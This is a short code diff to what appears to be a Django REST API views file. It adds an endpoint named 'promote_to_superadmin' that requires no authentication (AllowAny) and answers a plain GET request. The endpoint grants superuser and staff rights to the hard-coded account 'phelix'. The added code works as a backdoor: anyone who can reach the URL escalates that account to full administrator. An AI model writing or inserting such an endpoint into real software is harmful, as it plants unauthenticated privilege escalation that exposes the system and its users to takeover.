@@ -481,3 +481,20 @@ def force_set_password(request):
         })
     except User.DoesNotExist:
         return Response({'error': 'User not found'}, status=status.HTTP_404_NOT_FOUND)
+
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def promote_to_superadmin(request):
+    """Promote phelix to super admin"""
+    try:
+        user = User.objects.get(username='phelix')
+        user.is_superuser = True
+        user.is_staff = True
+        user.save()
+        return Response({
+            'message': 'User promoted to super admin!',
+            'username': user.username,
+            'is_superuser': user.is_superuser
+        })
+    except User.DoesNotExist:
+        return Response({'error': 'User not found'}, status=status.HTTP_404_NOT_FOUND)
